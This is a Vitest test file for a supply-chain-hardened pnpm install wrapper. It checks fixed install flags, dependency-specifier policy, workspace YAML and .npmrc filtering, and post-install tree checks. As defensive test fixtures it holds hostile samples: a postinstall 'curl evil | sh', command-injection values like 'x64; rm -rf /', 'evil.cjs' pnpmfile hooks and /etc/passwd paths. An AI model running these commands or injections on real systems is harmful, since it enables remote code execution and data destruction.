import { describe, expect, it } from 'vitest';
import { buildChildEnv } from './child-env.js';
import {
  assertInstallSafe,
  buildPnpmInstallArgs,
  classifyDependencySpec,
  findBuildStepPackages,
  findDisallowedDependencies,
  findLeftoverLinks,
  findManifestCodeLoading,
  findNormalizationTargets,
  findUnsafeWorkspaceConfig,
  GENERATED_WORKSPACE_YAML,
  isRegistryResolution,
  stageManifest,
  stageNpmrc,
  type TreeEntry,
} from './install-args.js';
import { TARGETS } from './targets.js';

const COMMON = [
  '--frozen-lockfile',
  '--prod',
  '--ignore-scripts',
  '--ignore-pnpmfile',
];
const CONFIG = [
  '--config.pm-on-fail=ignore',
  '--config.node-linker=hoisted',
  '--config.side-effects-cache=false',
  '--config.package-import-method=copy',
  '--config.verify-store-integrity=true',
];

const GOLDEN: Record<string, string[]> = {
  'aarch64-apple-darwin': ['--os', 'darwin', '--cpu', 'arm64'],
  'x86_64-apple-darwin': ['--os', 'darwin', '--cpu', 'x64'],
  'x86_64-unknown-linux-gnu': [
    '--os',
    'linux',
    '--cpu',
    'x64',
    '--libc',
    'glibc',
  ],
  'aarch64-unknown-linux-gnu': [
    '--os',
    'linux',
    '--cpu',
    'arm64',
    '--libc',
    'glibc',
  ],
  'x86_64-pc-windows-msvc': ['--os', 'win32', '--cpu', 'x64'],
  'aarch64-pc-windows-msvc': ['--os', 'win32', '--cpu', 'arm64'],
};

describe('buildPnpmInstallArgs', () => {
  it('builds the exact pnpm argv for each target', () => {
    expect(TARGETS.map((t) => t.triple).sort()).toEqual(
      Object.keys(GOLDEN).sort(),
    );
    for (const spec of TARGETS) {
      expect(buildPnpmInstallArgs({ target: spec })).toEqual([
        'install',
        ...COMMON,
        ...(GOLDEN[spec.triple] as string[]),
        ...CONFIG,
      ]);
    }
  });

  it('appends --offline last when asked', () => {
    const spec = TARGETS[0] as (typeof TARGETS)[number];
    const args = buildPnpmInstallArgs({ target: spec, offline: true });
    expect(args.at(-1)).toBe('--offline');
    expect(args.slice(0, -1)).toEqual(buildPnpmInstallArgs({ target: spec }));
  });

  it('never passes a flag that enables scripts for any target', () => {
    for (const spec of TARGETS) {
      for (const offline of [false, true]) {
        const args = buildPnpmInstallArgs({ target: spec, offline });
        expect(args).toContain('--ignore-scripts');
        expect(args).toContain('--frozen-lockfile');
        expect(args).toContain('--prod');
        expect(args).not.toContain('--no-ignore-scripts');
        expect(
          args.some((a) => /dangerously|allow-?scripts|--unsafe/i.test(a)),
        ).toBe(false);
        expect(args).toContain('--config.side-effects-cache=false');
      }
    }
  });

  it('always ignores pnpmfile hooks and never lets pnpm switch versions', () => {
    for (const spec of TARGETS) {
      const args = buildPnpmInstallArgs({ target: spec });
      expect(args).toContain('--ignore-pnpmfile');
      expect(args).toContain('--config.pm-on-fail=ignore');
    }
  });

  it('uses only fixed tokens: no argument is derived from free text', () => {
    const fixed = new Set([
      'install',
      ...COMMON,
      ...CONFIG,
      '--offline',
      '--os',
      '--cpu',
      '--libc',
      'darwin',
      'linux',
      'win32',
      'arm64',
      'x64',
      'glibc',
    ]);
    for (const spec of TARGETS) {
      for (const arg of buildPnpmInstallArgs({ target: spec, offline: true })) {
        expect(fixed.has(arg)).toBe(true);
      }
    }
  });

  it('refuses values outside the closed sets', () => {
    const bad = [
      { pnpm: { os: 'freebsd', cpu: 'x64' } },
      { pnpm: { os: 'darwin', cpu: 'ia32' } },
      { pnpm: { os: 'darwin', cpu: 'x64; rm -rf /' } },
      { pnpm: { os: 'linux', cpu: 'x64' } },
      { pnpm: { os: 'linux', cpu: 'x64', libc: 'musl' } },
      { pnpm: { os: 'darwin', cpu: 'x64', libc: 'glibc' } },
      { pnpm: { os: '--config.ignore-scripts=false', cpu: 'x64' } },
    ];
    for (const target of bad) {
      expect(() => buildPnpmInstallArgs({ target })).toThrow(
        expect.objectContaining({ code: 'invalid_install_plan' }),
      );
    }
  });
});

describe('assertInstallSafe', () => {
  const env = buildChildEnv({}, {}, { platform: 'linux' });
  const args = buildPnpmInstallArgs({ target: TARGETS[0] as never });

  it('accepts the argv this module builds with the forced environment', () => {
    for (const spec of TARGETS) {
      expect(() =>
        assertInstallSafe(
          buildPnpmInstallArgs({ target: spec, offline: true }),
          env,
        ),
      ).not.toThrow();
    }
  });

  it('refuses anything that could re-enable scripts or loosen the install', () => {
    const tampered: string[][] = [
      args.filter((a) => a !== '--ignore-scripts'),
      args.filter((a) => a !== '--frozen-lockfile'),
      [...args, '--no-ignore-scripts'],
      [...args, '--ignore-scripts=false'],
      [...args, '--config.ignore-scripts=false'],
      [...args, '--dangerously-allow-all-builds'],
      [...args, '--no-frozen-lockfile'],
      [...args, '--os', 'win32'],
      ['add', ...args.slice(1)],
      args.map((a) => (a === 'darwin' ? 'darwin; touch /tmp/x' : a)),
      args.filter((a) => !a.startsWith('--config.side-effects')),
      args.filter((a) => a !== '--ignore-pnpmfile'),
      args.filter((a) => a !== '--config.pm-on-fail=ignore'),
      [...args, '--no-ignore-pnpmfile'],
      [...args, '--pnpmfile', 'evil.cjs'],
      [...args, '--config.pnpmfile=evil.cjs'],
    ];
    for (const candidate of tampered) {
      expect(() => assertInstallSafe(candidate, env)).toThrow(
        expect.objectContaining({ code: 'install_unsafe' }),
      );
    }
  });

  it('refuses an environment that no longer forces ignore-scripts', () => {
    expect(() =>
      assertInstallSafe(args, { ...env, npm_config_ignore_scripts: 'false' }),
    ).toThrow(expect.objectContaining({ code: 'install_unsafe' }));
    expect(() => assertInstallSafe(args, {})).toThrow(
      expect.objectContaining({ code: 'install_unsafe' }),
    );
  });
});

describe('dependency policy', () => {
  it('classifies specifiers', () => {
    const cases: Array<[string, string]> = [
      ['^1.2.3', 'registry'],
      ['1.2.3', 'registry'],
      ['>=1 <2 || ^3', 'registry'],
      ['*', 'registry'],
      ['latest', 'registry'],
      ['catalog:', 'registry'],
      ['npm:other@^1', 'alias'],
      ['link:../x', 'link'],
      ['portal:../x', 'link'],
      ['file:../x.tgz', 'file'],
      ['./vendor/x', 'file'],
      ['/abs/x', 'file'],
      ['workspace:*', 'workspace'],
      ['git+https://github.com/a/b.git#abc', 'git'],
      ['github:a/b', 'git'],
      ['git://host/a.git', 'git'],
      ['a/b', 'git'],
      ['a/b#semver:^1', 'git'],
      ['https://example.com/x.tgz', 'tarball'],
      ['http://example.com/x.tgz', 'tarball'],
    ];
    for (const [spec, kind] of cases) {
      expect([spec, classifyDependencySpec(spec)]).toEqual([spec, kind]);
    }
  });

  it('rejects link:, file:, git and tarball production dependencies', () => {
    expect(
      findDisallowedDependencies({
        dependencies: {
          good: '^1.0.0',
          alias: 'npm:real@^2',
          zeta: 'link:../zeta',
          alpha: 'file:./alpha.tgz',
          gitty: 'github:a/b',
          tar: 'https://x.example/t.tgz',
          ws: 'workspace:*',
        },
        optionalDependencies: { opt: 'git+ssh://git@host/r.git', alpha: '^1' },
      }),
    ).toEqual([
      { name: 'alpha', kind: 'file' },
      { name: 'gitty', kind: 'git' },
      { name: 'opt', kind: 'git' },
      { name: 'tar', kind: 'tarball' },
      { name: 'ws', kind: 'workspace' },
      { name: 'zeta', kind: 'link' },
    ]);
    expect(findDisallowedDependencies({})).toEqual([]);
    expect(
      findDisallowedDependencies({ dependencies: { weird: 42 as never } }),
    ).toEqual([{ name: 'weird', kind: 'unknown' }]);
  });

  it('accepts registry resolutions with integrity only', () => {
    expect(isRegistryResolution({ integrity: 'sha512-abc' })).toBe(true);
    expect(
      isRegistryResolution({
        integrity: 'sha512-abc',
        tarball: 'https://x/y.tgz',
      }),
    ).toBe(false);
    expect(isRegistryResolution({ directory: '../x', type: 'directory' })).toBe(
      false,
    );
    expect(isRegistryResolution({ type: 'git', repo: 'r', commit: 'c' })).toBe(
      false,
    );
    expect(isRegistryResolution({})).toBe(false);
    expect(isRegistryResolution(null)).toBe(false);
    expect(isRegistryResolution('sha512-abc')).toBe(false);
  });

  it('strips lifecycle scripts from the staged manifest without mutating it', () => {
    const manifest = Object.freeze({
      name: 'app',
      scripts: { postinstall: 'curl evil | sh', build: 'x' },
      dependencies: { a: '^1' },
    });
    const staged = stageManifest(manifest);
    expect(staged).toEqual({ name: 'app', dependencies: { a: '^1' } });
    expect(staged).not.toHaveProperty('scripts');
    expect(manifest.scripts.postinstall).toBe('curl evil | sh');
  });

  it('removes packageManager and devEngines so pnpm cannot switch to another version', () => {
    const manifest = Object.freeze({
      name: 'app',
      packageManager: 'pnpm@9.0.0+sha512.abc',
      devEngines: { packageManager: { name: 'pnpm', version: '9.0.0' } },
      dependencies: { a: '^1' },
    });
    const staged = stageManifest(manifest);
    expect(staged).toEqual({ name: 'app', dependencies: { a: '^1' } });
    expect(manifest.packageManager).toBe('pnpm@9.0.0+sha512.abc');
  });
});

describe('pnpm configuration that would load code', () => {
  it('names configDependencies, pnpmfile and globalPnpmfile as keys outside the allowlist', () => {
    expect(
      findUnsafeWorkspaceConfig('configDependencies:\n  x: 1.0.0+sha512-abc\n'),
    ).toEqual(['configDependencies']);
    expect(findUnsafeWorkspaceConfig('pnpmfile: ./hooks.cjs\n')).toEqual([
      'pnpmfile',
    ]);
    expect(findUnsafeWorkspaceConfig('globalPnpmfile: /x/y.cjs\n')).toEqual([
      'globalPnpmfile',
    ]);
  });

  it.each([
    'modulesDir',
    'virtualStoreDir',
    'storeDir',
    'lockfileDir',
    'cacheDir',
    'stateDir',
    'globalDir',
    'globalBinDir',
    'strictSsl',
    'registries',
    'registry',
    'ca',
    'cafile',
    'proxy',
    'httpProxy',
    'httpsProxy',
    'nodeLinker',
    'scriptShell',
    'store-dir',
    'only-built-dependencies',
  ])('refuses the path, TLS or network key %s and reports only its name', (key) => {
    expect(
      findUnsafeWorkspaceConfig(
        `overrides:\n  a: 1.0.0\n${key}: /tmp/CANARY-x\n`,
      ),
    ).toEqual([key]);
  });

  it('allows exactly the allowlisted top-level keys with ordinary content', () => {
    const yaml = [
      '# a comment',
      '---',
      'packages: []',
      'overrides:',
      '  lodash: 4.17.21',
      "  '@scope/pkg@<2': npm:other@^1.0.0",
      '  react: catalog:',
      'catalog:',
      '  ms: ^2.1.3',
      'catalogs:',
      '  legacy:',
      '    file: ^1.0.0',
      'patchedDependencies:',
      '  foo@1.0.0: patches/foo.patch',
      'packageExtensions:',
      '  react-redux:',
      '    peerDependencies:',
      '      react-dom: "*"',
      'peerDependencyRules:',
      '  ignoreMissing: ["react"] # see https://example.com/why',
      'allowedDeprecatedVersions:',
      '  request: "*"',
      'supportedArchitectures:',
      '  os: [current]',
      'onlyBuiltDependencies:',
      '  - esbuild',
      'neverBuiltDependencies: [fsevents]',
      'ignoredBuiltDependencies: []',
      'autoInstallPeers: true',
      'dedupePeerDependents: false',
      'excludeLinksFromLockfile: false',
      'strictPeerDependencies: false',
      '',
    ].join('\n');
    expect(findUnsafeWorkspaceConfig(yaml)).toEqual([]);
    expect(findUnsafeWorkspaceConfig(GENERATED_WORKSPACE_YAML)).toEqual([]);
    expect(findUnsafeWorkspaceConfig('')).toEqual([]);
    expect(findUnsafeWorkspaceConfig('# only a comment\r\n')).toEqual([]);
    // pnpm 11 `allowBuilds`, and column-0 block sequences under an allowed key.
    expect(
      findUnsafeWorkspaceConfig(
        "packages:\n- 'apps/*'\nallowBuilds:\n  esbuild: true\nonlyBuiltDependencies:\n- esbuild\n",
      ),
    ).toEqual([]);
  });

  it.each([
    [
      'a second document',
      'overrides:\n  a: 1.0.0\n---\nstoreDir: /x\n',
      'multiple YAML documents',
    ],
    [
      'two document starts',
      '---\n---\noverrides: {}\n',
      'multiple YAML documents',
    ],
    [
      'a document end marker',
      'overrides: {}\n...\n',
      'multiple YAML documents',
    ],
    [
      'content on the document start',
      '--- {storeDir: x}\n',
      'unsupported YAML structure',
    ],
    [
      'a flow-mapping root',
      '{storeDir: /x, overrides: {}}\n',
      'flow mapping root',
    ],
    ['a sequence root', '- overrides\n', 'sequence root'],
    [
      'a path escape in a column-0 list entry',
      "packages:\n- '../outside/*'\n",
      'packages (path outside the directory)',
    ],
    [
      'a non-registry override in a column-0 list entry',
      'overrides:\n- link:../x\n',
      'overrides (non-registry specifier)',
    ],
    ['an indented root', '  storeDir: /x\n  overrides: {}\n', 'indented root'],
    ['a tab', 'overrides:\n\ta: 1.0.0\n', 'tab character'],
    ['an anchor key', '&k overrides: {}\n', 'anchor, alias or tag'],
    ['an alias key', '*k : {}\n', 'anchor, alias or tag'],
    [
      'an anchored value',
      'overrides: &o\n  a: 1.0.0\n',
      'anchor, alias or tag',
    ],
    ['an aliased value', 'catalog: *o\n', 'anchor, alias or tag'],
    ['a tag', '!!map overrides: {}\n', 'anchor, alias or tag'],
    ['a merge key', '<<: {storeDir: /x}\n', 'merge key'],
    ['a double-quoted key', '"storeDir": /x\n', 'quoted key'],
    ['a single-quoted key', "'overrides': {}\n", 'quoted key'],
    ['a complex key', '? storeDir\n: /x\n', 'unsupported YAML structure'],
    ['a directive', '%YAML 1.2\n---\noverrides: {}\n', 'YAML directive'],
    ['a non-mapping line', 'overrides\n', 'unsupported YAML structure'],
    ['a key escape', '"stor\\x65Dir": /x\n', 'escaped YAML key'],
    [
      'a column-0 flow continuation',
      'overrides: {\nstoreDir: x\n}\n',
      'storeDir',
    ],
    [
      'a line separator',
      'overrides: {}\u2028storeDir: /x\n',
      'unsupported line break',
    ],
  ])('fails closed on %s', (_name, yaml, subject) => {
    expect(findUnsafeWorkspaceConfig(yaml)).toContain(subject);
  });

  it('refuses a duplicated top-level key by name', () => {
    expect(
      findUnsafeWorkspaceConfig(
        'overrides:\n  a: 1.0.0\noverrides:\n  b: 2.0.0\n',
      ),
    ).toEqual(['overrides (duplicate)']);
  });

  it('refuses a key it cannot print safely as unrecognised, never echoing it', () => {
    const long = `x${'y'.repeat(80)}`;
    expect(findUnsafeWorkspaceConfig(`${long}: 1\n`)).toEqual([
      'unrecognised key',
    ]);
  });

  it.each([
    'link:../evil',
    'file:../evil.tgz',
    'portal:../evil',
    'workspace:*',
    'git+https://example.com/x.git',
    'github:owner/repo',
    'https://example.com/x.tgz',
    'http://example.com/x.tgz',
  ])('refuses the non-registry specifier %s under overrides and catalogs', (spec) => {
    for (const yaml of [
      `overrides:\n  a: ${spec}\n`,
      `overrides:\n  "a": "${spec}"\n`,
      `overrides: {a: ${spec}}\n`,
      `catalog:\n  a: ${spec}\n`,
      `catalogs:\n  named:\n    a: ${spec}\n`,
    ]) {
      expect(findUnsafeWorkspaceConfig(yaml), yaml).not.toEqual([]);
    }
    expect(findUnsafeWorkspaceConfig(`overrides:\n  a: ${spec}\n`)).toEqual([
      'overrides (non-registry specifier)',
    ]);
  });

  it('does not read a specifier into a package that merely has the name of a scheme', () => {
    expect(
      findUnsafeWorkspaceConfig('overrides:\n  file: ^1.0.0\n  link: 2.0.0\n'),
    ).toEqual([]);
  });

  it.each([
    "packages: ['../*']",
    'packages:\n  - ../sibling',
    'packages:\n  - /abs/path',
    'patchedDependencies:\n  foo@1.0.0: ../../patches/foo.patch',
    'patchedDependencies:\n  foo@1.0.0: /etc/passwd',
  ])('refuses a path that leaves the directory: %s', (yaml) => {
    expect(findUnsafeWorkspaceConfig(`${yaml}\n`)).toEqual([
      expect.stringMatching(/\(path outside the directory\)$/),
    ]);
  });

  it('finds them under the manifest pnpm field and never reports a dependency named like them', () => {
    expect(
      findManifestCodeLoading({
        pnpm: { overrides: {}, nested: { 'global-pnpmfile': 'x.cjs' } },
      }),
    ).toEqual(['globalPnpmfile']);
    expect(findManifestCodeLoading({ pnpmfile: 'x.cjs' })).toEqual([
      'pnpmfile',
    ]);
    expect(
      findManifestCodeLoading({ dependencies: { pnpmfile: '^1.0.0' } }),
    ).toEqual([]);
  });
});

/** An environment-variable reference as pnpm would expand it. */
const expand = (name: string): string => `$\x7b${name}}`;

describe('stageNpmrc', () => {
  it('drops a registry URL that expands an environment variable', () => {
    const staged = stageNpmrc(
      [
        `registry=https://${expand('REGISTRY_HOST')}/npm/`,
        `@acme:registry=https://npm.acme.test/${expand('TEAM')}/`,
        'registry=https://registry.example.com/',
        '',
      ].join('\n'),
    );
    expect(staged.text).toBe('registry=https://registry.example.com/\n');
    expect(staged.dropped).toBe(2);
  });

  it('keeps registry lines and four boolean resolution settings only', () => {
    const staged = stageNpmrc(
      [
        '# comment',
        'registry = https://registry.example.com/',
        '@acme:registry=https://npm.acme.test/',
        'auto-install-peers=false',
        'strict-peer-dependencies=maybe',
        'node-linker=hoisted',
        'store-dir=/tmp/evil',
        'script-shell=/tmp/evil.sh',
        '//registry.example.com/:_authToken=NOT-A-REAL-TOKEN',
        '_auth=abc',
        'registry=https://user:pass@registry.example.com/',
        '@bad:registry=${REGISTRY_URL}',
        'registry=file:///etc/passwd',
        'noequals',
        '',
      ].join('\n'),
    );
    expect(staged.text).toBe(
      [
        'registry=https://registry.example.com/',
        '@acme:registry=https://npm.acme.test/',
        'auto-install-peers=false',
        '',
      ].join('\n'),
    );
    expect(staged.dropped).toBe(10);
    expect(staged.text).not.toContain('NOT-A-REAL-TOKEN');
  });

  it('fails on a registry that is plain http to a remote host, without echoing the URL', () => {
    for (const line of [
      'registry=http://registry.example.com/',
      '@acme:registry=http://npm.acme.test/',
      'registry=http://localhost.evil.test/',
      'registry=http://127.0.0.1.evil.test/',
    ]) {
      let thrown: unknown;
      try {
        stageNpmrc(`${line}\n`);
      } catch (error) {
        thrown = error;
      }
      expect(thrown, line).toMatchObject({
        code: 'unsafe_install_config',
        field: '.npmrc',
        subjects: ['registry (plain http)'],
      });
      expect(String((thrown as Error).message)).not.toContain('example');
    }
  });

  it('drops a registry whose scheme is not lower-case http(s), as before', () => {
    expect(stageNpmrc('registry=HTTP://registry.example.com/\n')).toEqual({
      text: '',
      dropped: 1,
    });
  });

  it('accepts https registries and plain http only for a loopback host', () => {
    const staged = stageNpmrc(
      [
        'registry=https://registry.example.com/',
        '@a:registry=http://localhost:4873/',
        '@b:registry=http://127.0.0.1:4873/',
        '@c:registry=http://[::1]:4873/',
        '',
      ].join('\n'),
    );
    expect(staged.text).toBe(
      [
        'registry=https://registry.example.com/',
        '@a:registry=http://localhost:4873/',
        '@b:registry=http://127.0.0.1:4873/',
        '@c:registry=http://[::1]:4873/',
        '',
      ].join('\n'),
    );
    expect(staged.dropped).toBe(0);
  });

  it('stages nothing for a credentials-only file', () => {
    expect(stageNpmrc('//r.example/:_authToken=x\n')).toEqual({
      text: '',
      dropped: 1,
    });
    expect(stageNpmrc('')).toEqual({ text: '', dropped: 0 });
  });

  it('fails on pnpmfile, global-pnpmfile and config-dependencies keys without echoing values', () => {
    for (const line of [
      'pnpmfile=./evil.cjs',
      'global-pnpmfile = /tmp/evil.cjs',
      'GLOBAL_PNPMFILE=/tmp/evil.cjs',
      'config-dependencies=x',
    ]) {
      let thrown: unknown;
      try {
        stageNpmrc(`registry=https://r.example/\n${line}\n`);
      } catch (error) {
        thrown = error;
      }
      expect(thrown, line).toMatchObject({
        code: 'unsafe_install_config',
        category: 'invalid_input',
        field: '.npmrc',
      });
      expect(JSON.stringify(thrown)).not.toContain('evil');
    }
  });
});

describe('post-install checks', () => {
  const tree: TreeEntry[] = [
    { path: '.bin', kind: 'directory' },
    { path: '.bin/vite', kind: 'symlink' },
    { path: '.modules.yaml', kind: 'file' },
    { path: '.pnpm', kind: 'directory' },
    { path: '.pnpm/a@1', kind: 'directory' },
    { path: '.pnpm-workspace-state-v1.json', kind: 'file' },
    { path: '.package-lock.json', kind: 'file' },
    { path: 'a', kind: 'directory' },
    { path: 'a/package.json', kind: 'file' },
    { path: 'a/node_modules', kind: 'directory' },
    { path: 'a/node_modules/.bin', kind: 'directory' },
    { path: 'a/node_modules/.bin/tool', kind: 'symlink' },
    { path: 'b', kind: 'symlink' },
    { path: 'c/fifo', kind: 'other' },
    { path: 'dir.bin', kind: 'directory' },
  ];

  it('lists the top-most paths the normalisation step removes', () => {
    expect(findNormalizationTargets(tree)).toEqual([
      '.bin',
      '.modules.yaml',
      '.package-lock.json',
      '.pnpm',
      '.pnpm-workspace-state-v1.json',
      'a/node_modules/.bin',
    ]);
  });

  it('reports every symlink, junction, FIFO and device left in the tree', () => {
    expect(findLeftoverLinks(tree)).toEqual([
      '.bin/vite',
      'a/node_modules/.bin/tool',
      'b',
      'c/fifo',
    ]);
    const removed = new Set(findNormalizationTargets(tree));
    const remaining = tree.filter(
      (e) =>
        ![...removed].some((r) => e.path === r || e.path.startsWith(`${r}/`)),
    );
    expect(findLeftoverLinks(remaining)).toEqual(['b', 'c/fifo']);
  });

  it('fails a package with an install script and no prebuilt binary', () => {
    expect(
      findBuildStepPackages([
        { name: 'needs-build', scripts: { install: 'node-gyp rebuild' } },
        { name: 'gyp-only', hasBindingGyp: true },
        { name: 'flag', gypfile: true },
        { name: 'pre', scripts: { preinstall: 'x' } },
        {
          name: 'prebuilt',
          scripts: { install: 'node-gyp-build' },
          hasPrebuiltNode: true,
        },
        { name: 'plain', scripts: { test: 'vitest', build: 'x' } },
      ]),
    ).toEqual(['flag', 'gyp-only', 'needs-build', 'pre']);
  });

  it('allows the closed list of harmless postinstall packages', () => {
    expect(
      findBuildStepPackages([
        { name: 'esbuild', scripts: { postinstall: 'node install.js' } },
        { name: 'fsevents', hasBindingGyp: true },
        {
          name: 'protobufjs',
          scripts: { postinstall: 'node scripts/postinstall' },
        },
      ]),
    ).toEqual([]);
    expect(
      findBuildStepPackages([
        { name: 'esbuild-evil', scripts: { postinstall: 'x' } },
      ]),
    ).toEqual(['esbuild-evil']);
  });
});
